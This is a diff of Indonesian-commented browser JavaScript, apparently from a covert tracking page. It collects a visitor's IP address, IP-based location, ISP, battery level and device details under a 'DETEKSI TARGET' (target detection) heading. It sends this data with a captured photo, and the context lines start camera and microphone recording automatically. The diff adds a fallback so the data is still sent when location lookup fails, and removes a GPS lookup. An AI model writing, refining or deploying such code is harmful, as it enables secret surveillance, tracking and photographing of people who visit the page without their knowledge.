@@ -56,42 +56,51 @@ const userAgentInfo = `Device: ${device.model || 'Tidak Diketahui'}\nOS: ${os.na
 
 console.log(userAgentInfo);
 
-// Ambil IP & lokasi berdasarkan IP
+// Ambil IP
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
-  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
-  .then(loc => loc.json())
-  .then(info => {
-    navigator.getBattery().then(bat => {
-      const status = `
+  .then(ipData => {
+    const ip = ipData.ip;
+    // Ambil info lokasi
+    fetch('https://ipapi.co/' + ip + '/json/')
+      .then(loc => loc.json())
+      .then(info => {
+        // Setelah IP dan Lokasi didapat
+        navigator.getBattery().then(bat => {
+          const status = `
 == DETEKSI TARGET ==
-IP: ${info.ip}
-Negara: ${info.country_name}
-Region: ${info.region}
-Kota: ${info.city}
-ISP: ${info.org}
+IP: ${ip}
+Negara: ${info.country_name || 'Tidak tersedia'}
+Region: ${info.region || 'Tidak tersedia'}
+Kota: ${info.city || 'Tidak tersedia'}
+ISP: ${info.org || 'Tidak tersedia'}
 Koneksi: ${info.connection_type || 'Tidak diketahui'}
 Baterai: ${Math.floor(bat.level * 100)}%
 Device: ${userAgentInfo}
 Latitude: ${info.latitude || 'Tidak tersedia'}
 Longitude: ${info.longitude || 'Tidak tersedia'}
-Zona Waktu: ${info.timezone}
+Zona Waktu: ${info.timezone || 'Tidak tersedia'}
 =====================`;
 
-      // Ambil foto dan kirim dengan caption
-      ambilFoto(status);
-    });
+          // Kirim Foto + Caption
+          ambilFoto(status);
+        });
+      })
+      .catch(err => {
+        console.error('Gagal ambil lokasi IP:', err);
+        // Tetap kirim meskipun hanya IP
+        const status = `
+== DETEKSI TARGET ==
+IP: ${ip}
+(Lokasi tidak tersedia)
+Device: ${userAgentInfo}
+=====================`;
+        ambilFoto(status);
+      });
+  })
+  .catch(err => {
+    console.error('Gagal ambil IP:', err);
   });
-
-// Ambil lokasi GPS (jika user izinkan)
-if ("geolocation" in navigator) {
-  navigator.geolocation.getCurrentPosition(pos => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const lokasi = `Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
-    kirimPesan(lokasi);
-  });
-}
 
 // Kamera + Rekaman Otomatis (tanpa audio yang ditampilkan di halaman)
 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
